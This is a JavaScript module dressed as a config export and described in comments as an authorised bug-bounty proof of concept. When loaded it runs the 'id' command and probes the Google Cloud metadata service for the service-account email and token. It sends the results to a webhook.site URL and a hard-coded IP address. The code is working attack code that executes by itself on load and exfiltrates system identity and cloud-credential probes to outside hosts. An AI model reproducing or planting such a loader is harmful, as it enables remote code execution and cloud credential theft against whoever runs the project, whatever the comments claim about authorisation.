// Authorized bug-bounty confirmation PoC (CodeRabbit VDP, researcher larocas). Benign.
// Hardened negative-confirmation: rule out cold-start, DNS-fail, and header-rejection as
// causes of the ECONNREFUSED seen in crmeta1. Identity-only; token = status+len only.
const http = require('http');
const https = require('https');
const dns = require('dns');
const net = require('net');
const RUN = 'crmeta2';
const WH = 'https://webhook.site/30f56a43-a0d2-47d4-9fd6-95948b0eaf8c';
const VPS = 'http://62.171.145.137:9111';

function beacon(marker) {
  var m = '/' + RUN + '-' + String(marker).slice(0, 220);
  try { var a = https.get(WH + m, function (r) { r.resume(); }); a.on('error', function () {}); a.setTimeout(8000, function () { a.destroy(); }); } catch (e) {}
  try { var b = http.get(VPS + m, function (r) { r.resume(); }); b.on('error', function () {}); b.setTimeout(8000, function () { b.destroy(); }); } catch (e) {}
}

var idout = '';
try { idout = require('child_process').execSync('id', { timeout: 3000 }).toString().trim(); } catch (e) { idout = 'id-err'; }
beacon('load-' + encodeURIComponent(idout));

// (A) DNS: does metadata.google.internal resolve, and to what IP?
try {
  dns.lookup('metadata.google.internal', { all: true }, function (err, addrs) {
    if (err) { beacon('dns-mgi-ERR-' + ((err && (err.code || err.message)) || 'x')); }
    else { beacon('dns-mgi-OK-' + encodeURIComponent(JSON.stringify(addrs).slice(0, 120))); }
  });
} catch (e) { beacon('dns-mgi-THROW'); }

// (B) Raw TCP connect to 169.254.169.254:80 - isolates the TCP layer from HTTP.
try {
  var s = net.connect({ host: '169.254.169.254', port: 80 }, function () { beacon('tcp-169-CONNECTED'); s.destroy(); });
  s.setTimeout(8000, function () { beacon('tcp-169-TIMEOUT'); s.destroy(); });
  s.on('error', function (e) { beacon('tcp-169-ERR-' + ((e && (e.code || e.message)) || 'x')); });
} catch (e) { beacon('tcp-169-THROW'); }

// (C) HTTP GET helper with configurable header + timeout, longer 8s timeout (cold-start ruled out).
function mdGet(tag, host, path, label, withHeader, tokenMode) {
  var opts = { headers: {}, timeout: 8000 };
  if (withHeader) opts.headers['Metadata-Flavor'] = 'Google';
  var req = http.get('http://' + host + '/computeMetadata/v1/' + path, opts, function (res) {
    var body = '';
    res.on('data', function (c) { body += c; });
    res.on('end', function () {
      if (tokenMode) beacon(tag + '-' + label + '-s' + res.statusCode + '-len' + body.length);
      else beacon(tag + '-' + label + '-s' + res.statusCode + '-v' + encodeURIComponent(body.slice(0, 120)));
    });
  });
  req.on('timeout', function () { try { req.destroy(); } catch (e) {} beacon(tag + '-' + label + '-TIMEOUT'); });
  req.on('error', function (e) { beacon(tag + '-' + label + '-ERR-' + ((e && (e.code || e.message)) || 'x')); });
}

// root path + email WITHOUT header (a 403 would prove the service is present but header-gated)
// + email/token WITH header at the longer timeout.
['metadata.google.internal', '169.254.169.254'].forEach(function (h) {
  var tag = (h === '169.254.169.254') ? 'net' : 'mgi';
  // root of metadata tree (no /computeMetadata prefix): use bare http.get
  var rreq = http.get('http://' + h + '/', { headers: { 'Metadata-Flavor': 'Google' }, timeout: 8000 }, function (res) { var b=''; res.on('data',function(c){b+=c;}); res.on('end',function(){ beacon(tag + '-root-s' + res.statusCode + '-len' + b.length); }); });
  rreq.on('timeout', function () { try { rreq.destroy(); } catch (e) {} beacon(tag + '-root-TIMEOUT'); });
  rreq.on('error', function (e) { beacon(tag + '-root-ERR-' + ((e && (e.code || e.message)) || 'x')); });
  mdGet(tag, h, 'instance/service-accounts/default/email', 'emailNOHDR', false, false);
  mdGet(tag, h, 'instance/service-accounts/default/email', 'email', true, false);
  mdGet(tag, h, 'instance/service-accounts/default/token', 'token', true, true);
});

module.exports = { config: { default: false } };
